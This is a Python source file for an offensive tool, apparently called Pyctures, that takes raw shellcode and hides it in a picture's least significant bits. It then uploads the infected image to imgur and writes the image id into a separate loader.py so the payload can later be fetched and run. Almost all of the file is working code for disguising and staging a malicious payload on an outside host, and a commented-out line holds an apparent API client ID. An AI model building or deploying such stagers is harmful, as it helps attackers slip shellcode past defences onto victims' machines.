import os
import sys
import pyimgur
import argparse
from PIL import Image

# IMGUR_CLIENT_ID = "2626883c2cd43e1"
IMGUR_CLIENT_ID = ""

# Always start with a cool banner
def banner():
    print("""

██████╗ ██╗   ██╗ ██████╗████████╗██╗   ██╗██████╗ ███████╗███████╗
██╔══██╗╚██╗ ██╔╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝██╔════╝
██████╔╝ ╚████╔╝ ██║        ██║   ██║   ██║██████╔╝█████╗  ███████╗
██╔═══╝   ╚██╔╝  ██║        ██║   ██║   ██║██╔══██╗██╔══╝  ╚════██║
██║        ██║   ╚██████╗   ██║   ╚██████╔╝██║  ██║███████╗███████║
╚═╝        ╚═╝    ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                   
                Made with ♥ by Atsika & Leco
""")

# Retrieve shellcode from file specified as parameter
def get_shellcode(shellcode_path):
    try:
        print("[*] Getting shellcode from {}".format(shellcode_path))
        with open(shellcode_path,"rb") as f:
            byte_array = bytearray(f.read())
        shellcode = []
        for b in byte_array:
            shellcode.append([int(i) for i in "{0:08b}".format(b)])
    except OSError:
        print("[-] Couldn't read shellcode from file")
        sys.exit(1)
    print("[+] Shellcode retrieved")
    print("[*] Shellcode length {} bytes".format(len(shellcode)))
    return shellcode

# Keep track of current byte and bit in the shellcode
def inc_bit(byte, bit):
    bit += 1
    if bit == 8:
        bit = 0
        byte += 1
    return byte, bit

# Embed shellcode in picture specified as parameter using LSB
def shellcode_to_lsb(shellcode, picture):
    print("[*] Opening picture {}".format(picture))
    try:
        img = Image.open(picture)
    except:
        print("[-] Couldn't open {}".format(picture))
    pixel = img.load()
    width, height = img.size
    byte = 0
    bit = 0
    over = False
    
    print("[*] Embedding shellcode in picture")
    for i in range(width):
        for j in range(height):

            red, green, blue = img.getpixel((i, j))

            red = "{0:08b}".format(red)[:-1] + str(shellcode[byte][bit])
            byte, bit = inc_bit(byte, bit)
            if (byte == len(shellcode)):
                over = True
                pixel[i, j] = (int(red, 2), green, blue)
                break

            green = "{0:08b}".format(green)[:-1] + str(shellcode[byte][bit])
            byte, bit = inc_bit(byte, bit)
            if (byte == len(shellcode)):
                over = True
                pixel[i, j] = (int(red, 2), int(green, 2), blue)
                break

            blue = "{0:08b}".format(blue)[:-1] + str(shellcode[byte][bit])
            byte, bit = inc_bit(byte, bit)
            if (byte == len(shellcode)):
                over = True
                pixel[i, j] = (int(red, 2), int(green, 2), int(blue, 2))
                break

            pixel[i, j] = (int(red, 2), int(green, 2), int(blue, 2))

        if (over == True):
                break

    print("[+] Shellcode embedded")
    filename = str(len(shellcode)*8)+".png"
    img.save(filename)
    print("[+] Picture saved as {}".format(filename))
    return filename

# Delete infected picture
def delete_pic(filename):
    os.remove(filename)

# Upload infected picture using imgur API
def upload_to_imgur(filename, imgur_id):
    print("[*] Authenticating to imgur.com")
    im = pyimgur.Imgur(imgur_id)
    print("[*] Uploading {}".format(filename))
    uploaded_image = im.upload_image(filename, title=filename)
    img_id = uploaded_image.link.split("/")[-1].split(".")[0]
    print("[+] Image id {} ({})". format(img_id ,uploaded_image.link))
    return img_id

# Modify loader.py to match newly generated picture id and imgur client id
def build_loader(img_id, imgur_id):
    print("[*] Building loader.py")
    lines = []
    with open("loader.py", "r") as f:
        lines = f.readlines()
        for i in range(len(lines)):
            if "IMGUR_IMG_ID =" in lines[i]:
                lines[i] = "IMGUR_IMG_ID = \"" + img_id + "\"\n"
            if "IMGUR_CLIENT_ID =" in lines[i]:
                lines[i] = "IMGUR_CLIENT_ID = \"" + imgur_id + "\"\n"
        with open("loader.py", "w") as g:
            for line in lines:
                g.write(line)
    print("[+] Run: python loader.py")

# Main function
def main():
    banner()

    parser = argparse.ArgumentParser(description='Embed shellcode into a picture using LSB')
    parser.add_argument('-s', '--shellcode', metavar='FILE', dest='shellcode_path', help='Path to raw shellcode', required=True)
    parser.add_argument('-p', '--picture', metavar='PICTURE', dest='picture', help='Picture to inject shellcode into', required=True)
    parser.add_argument('-i', '--imgur-client-id', metavar='ID', dest='imgur_id', help='imgur client id to upload picture')
    parser.add_argument('-l', '--loader', dest='loader', help='Build loader', action="store_true")
    args = parser.parse_args()
    
    shellcode = get_shellcode(args.shellcode_path)
    infected_picture = shellcode_to_lsb(shellcode, args.picture)

    if args.imgur_id:
        id = upload_to_imgur(str(len(shellcode)*8)+".png", args.imgur_id)
        delete_pic(infected_picture)

    if args.loader:
        build_loader(id, args.imgur_id)
        
# Entrypoint
if __name__ == "__main__":
    main()